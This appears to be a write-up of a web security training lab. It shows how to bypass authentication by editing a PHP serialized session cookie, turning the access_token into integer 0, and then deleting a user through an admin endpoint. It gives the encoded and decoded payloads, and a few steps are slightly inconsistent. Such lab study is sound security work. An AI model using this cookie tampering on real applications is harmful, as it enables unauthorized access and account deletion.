## Lab: Modifying serialized data types

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user **carlos**.

You can log in to your own account using the following credentials: **wiener:peter**

### Exploit and analysis

1. Login as user _wiener_
    1. Capture session cookie
2. Base64 decode it `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvdzBwNHdkcnhnajZ0Ym92emliN2hpM2RveGV5MmpjciI7fQ%3d%3d` = `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ow0p4wdrxgj6tbovzib7hi3doxey2jcr";}`

PHP serialization syntax uses **s** to identify string data-type and **i** for integer data-type, replace the access_token value with **0** and remove both quotations and value length.

3. Change the cookie to
`Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==` = `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`
    1  Base64 encode the cookie
    2. Repeat request for **/my-account?id=administrator**
    3. Note that a link for **Admin panel** is not available

```html
 <div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```

4. Perform a GET request for the URL above and delete the user carlos